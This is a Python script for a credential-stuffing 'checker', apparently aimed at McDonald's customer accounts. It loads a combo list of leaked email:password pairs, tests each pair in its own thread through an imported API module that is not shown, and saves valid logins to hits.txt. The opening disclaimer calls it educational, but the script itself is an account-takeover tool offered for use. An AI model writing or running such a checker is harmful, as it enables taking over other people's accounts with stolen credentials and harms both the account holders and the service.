# ================================================================
#  DISCLAIMER
#  This script is for EDUCATIONAL and HUMOROUS purposes only.
#  It has NEVER been used for anything outside of learning.
#  I do NOT encourage anyone to use it for any other purpose
#  than education and self-instruction.
#  Any misuse is the sole responsibility of the user.
# ================================================================

import os, threading
from colorama import init, Fore, Style
from modules import api, optimization, captcha

init(autoreset=True)

class McDoChecker:
    def __init__(self):
        self.hits = 0
        self.bad = 0
        self.lock = threading.Lock()
        self.cpm_counter = optimization.CPMCounter()

    def ui(self):
        os.system("cls" if os.name == "nt" else "clear")
        banner = f"""{Fore.YELLOW}\n        __  ___     ____           ________              __            \n       /  |/  /____/ __ \____     / ____/ /_  ___  _____/ /_____  _____\n      / /|_/ / ___/ / / / __ \   / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/\n     / /  / / /__/ /_/ / /_/ /  / /___/ / / /  __/ /__/ ,< /  __/ /    \n    /_/  /_/\___/_____/\____/   \____/_/ /_/\___/\___/_/|_|\___/_/     {Style.RESET_ALL} \n                                                                                                              \n            >>> developed by {Fore.YELLOW}mirai{Style.RESET_ALL}                                                                                                               """
        print(banner)

    def checker(self, email, password):
        result = api.check_account(email, password)
        self.cpm_counter.tick()
        if result["valid"]:
            with self.lock:
                self.hits += 1
                print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] HIT | {email}:{password} | Menu: {result['menu']}")
                with open("hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password} | Menu = {result['menu']}\n")
        else:
            with self.lock:
                self.bad += 1
                print(f"  [{Fore.RED}-{Style.RESET_ALL}] BAD | {email}:{password}")

    def main(self):
        self.ui()
        
        if not captcha.show_captcha():
            print(f"  [{Fore.RED}-{Style.RESET_ALL}] CAPTCHA incorrect.")
            return

        path = input(f"  [{Fore.YELLOW}~{Style.RESET_ALL}] Path to combo list (email:mdp)> ").strip()
        if not os.path.exists(path):
            print(f"  [{Fore.RED}-{Style.RESET_ALL}] Combo file not found.")
            return

        with open(path, "r", encoding="utf-8") as f:
            combos = [line.strip() for line in f if ":" in line]

        threads = []
        for combo in combos:
            email, pwd = combo.split(":")
            t = threading.Thread(target=self.checker, args=(email, pwd))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f"  \n[{Fore.GREEN}+{Style.RESET_ALL}] Task completed | Hits: {self.hits} | Bad: {self.bad} | CPM: {self.cpm_counter.cpm}")

if __name__ == "__main__":
    McDoChecker().main()